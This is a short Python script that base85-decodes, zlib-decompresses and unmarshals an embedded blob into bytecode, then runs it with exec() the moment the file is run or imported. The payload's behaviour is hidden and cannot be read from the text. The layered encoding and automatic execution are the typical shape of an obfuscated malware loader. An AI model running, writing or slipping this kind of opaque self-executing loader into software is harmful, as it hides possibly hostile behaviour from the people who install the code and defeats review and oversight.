import base64
import marshal
import zlib
import types

def decrypt_code():
    encoded = b'c${@t-ESMm5x?F0K2nrIDXJa2iBcp;Sfpy~x_vMLr)eCgKwTk)4Fn-v5GU?QB7M4}_Vz-HI0i1HxOQyU2HK_{b`TPE>!e?4io$i;6#YN$wWe%6^{o$nh&!`))Q2TY;O^b*%--J2Z+<iPALXGx6@K4_Uo;B?QyB4;YBrN9ku$AQn5nNWYE_Nkn(FI|M%9qlnr|*zRZCv$K3%k{Hp%Rrs`I+S3}&t>%v_<>0wX7sinWeUovDztIPV1>cZF9w?JdK-am?d^C*Z1la)Em;dm{|}*UotLScDv;+VQY{y8g)XABVwH@XT;t!sx0}RhjB(bChXJU)8EQdyJXPS|wG3+021;lNDGIW{Zum63jLmWn(Zq%z%@Y)AI3<yGOk`Uv7!-yMa6J@jBV^Y`oUt_bNU=fni=rl$s*Q3eIo}7*(M)^`0R|Q&@e{N2x9EokVHcj54*af~>Gbru8XEiVXJ|5vAT}AFsy5V@zkpW!#}G#(NW>`*@$Azu~;*Ox5lzxWW9v7Y`n)8jB(G{HUt?@D5RGwL^Y-&JWw`6wX;8)xx5CriMa~N0rHRlx45!vD#e2_act(mFhJge4bh@H;O=)r8JCEt>ub^)MO1FxQkwDL8yEwvTD+{R!i+!H}Yyys5QezklJ{POfWJ$Np?G0%b#2mGU%zk6nn9k>OYWEA=^^QxQ1u4YhI3t)By0DX$U;Rd?OMbPtCgTxk23e7~m3l{@lk3e+rE5TQ5a|H-h;ic*sW35VcwXgEj$!K`dgBNjgEwFgv73#z<%1&d^T}EmMPgBIZGzZoz_+|0EXn05TGCigsyN?JNk0U6ZVkt|n-r!K@240d%a;E5)vn7(K18bj>#*$23J#R#c({)&V8@N*f}J|8K!B(R+Gg_DR<QTfjBgj!0W0u@C_}tY6t?tu)OmB{^F?J5hJFsBX0o4%0-TS?rA@v`?-nAJCP|Mn3^IqO^RGC|$_(&Nyfq3B3k6E=Ci31$DJd_bqrr*M7%l)`|S8P1;Juj?3VqdpCbG_~hK+^3U(w{{7nfKfd$NTPfwUGbwG)#wA!^JAZZX-iMji;i;4H$fnJWPw)Nhw^R4&;i+SlF^)mt7)*{-kZNJe3sMcC1o@o>FxA_<0r0^1a2vG@w*_hdwicj5@FFhY6H*J2D{*bVcBbyNL?aAR6~I$*_>*#fm(NG3(+FCzkl0KMVJtRoRN%6d%%vLMRc#4g<_fo3+DtIKPl+dynGI98b8(mmXtW1m^i>!vN&%A=DN={*f8eM^T7=osN-$2U1}Tv}@Uza+FFH@{g4wNm&eYY10BZ~Zy9$F)dL#jQI;#Be@F}&ccD1ga=x}$iYcSF^0kZTo<@*72NLhsMXIj?`3Lw`({+yH>Ab$?!iOG)$rK$F`L`{r7?OKV|(~*GT+6EvRJu|TqdyXO)mx@a|vw_5%cpnD;XSdd`om;<t_TKM)G`O*P_v*R3zh2EyaxB%5OFEO&kvr!JFNi`OO?yG^+>_h{`_AZeGYW%EamU%bPNDi(GUTb&c732XKtj}R0RJEaIHEH(x!3aDy2mjPsS5GU0RTm!!M!@r&vG7KvE1?iaA7D?QcLxWKEEMV8&ORFUOd6Sjyu1&5%A5ZkJLlohy60zJ%GX355okth$acC46{Z{l9uRM`akVKXKI%~Z`)>Dl|t6EhJijMt5lcRN(ZY4gdDgBYE6^&pawNH$adhYgaF&*ED<=6??%&HetO6b0c|Twpaak_Kv(TqeUL9b%P0g;jnQLS(AIzX;o$r)?%e*<M)Xe3RBY+essmoB1!3E52)-8uMikF3!p%3)H5D8tQLMkV*b>V~xl!zkik1bzoQr{h!OzpuG`rj3+7=J%UKC|MkxjxA=nu#!$SFDoc~b)C(g*au<v8RKj@`D&Hpi;DbERW1$qdSgo(L+DuQYYYhke4pR-ma5X*5v)`*6>|*+8{JT_AFP0CX`B)<e1$wgmFdMrRM7l#o3TKCsax1sflzXv0iwwBlzl5Z6B%T>Z)5%3tpO<KK5bx(KmYyKwVf|58S!Yd^hw=U><3=TY(VvxA!#*Dm~F?aGzGXScHTH}g`R1#fWUv%^y|zp|}&vp@%K)&3T0@7?6?KVJf3|L^CQ2Je2FVPq;sBAVK$0y7mSRedjzJiUdO4XE^yh&Wbkj>O1c#$g<XSFoi~Gh~!SC|o~_R&Cas3%OSv&188bJ@znA_HOhbuJ6}m!<2U;Zw#9RhnCa~FgRLz3EG9u3%fN5kJ@TS=ePkKL?-4UBe4=W!>o*+L||Y}VuyGc`$4JI(<J~5CaWy=)UvPEv%I_d$>6;_;+e;@xX+xd(A3DdC^eYtErx+)+MTL{zyCGcrDF2OWl01UbN$BKP!h8@fj%lVvKE~mMGZZIokbRvFYm^2a((C-hVMKkIZng$Bi0v=RwUZ}UDI!y>5lX(41M^=+=r2l-Vo6L3uH9~`w^yQX@U2^S%<o$Ga=Nb1{??Fjz2F{=%NU+9oT8fmTqTh9JtS1ejR!pNWM-P)^%KGhOiR)P_IL}^c}i1p3T_l$Y{xQg)667z~Xl~j~R49ve4ar7jj_j!r8U!7xEwssd7fPJb98ywW)YKPnA4-rQY=Pbo?dMgt(pWt^exA*2Tk_O|~%1OW8j0XF+}pKdX>}E5$6|WC*{rE%W%RGW|F}=53F^fReAtpku4eC3mM*v=9pxwu3wiW%=WWc0z$;Z3{49sAd2FCZVsPP~05k;<F|44E8b)9IdQ&p4hF-W&M4H%v1{4%VVns9l2Ah!S_xqKR${z_*`)PY=u9K=hJ54Q!=Y8FAoVrLYIGUc&IH0-8?P!N6rwgmSU08h_lxkwZ^Q8q9a$qane&*Son95fQoseA(LNrr`2&O2<N%mT3DW*lb^Y=TdkJsVNj1b_X06JENRFK^7Bg;K>3v24wqUlWv_e$lOihTCxlKh|F=k){vYo$f(H'
    compressed = base64.b85decode(encoded)
    marshalled = zlib.decompress(compressed)
    code = marshal.loads(marshalled)
    return types.CodeType(
        code.co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount,
        code.co_nlocals, code.co_stacksize, code.co_flags, code.co_code,
        code.co_consts, code.co_names, code.co_varnames, code.co_filename,
        code.co_name, code.co_firstlineno, code.co_lnotab, code.co_freevars,
        code.co_cellvars
    )

exec(decrypt_code())
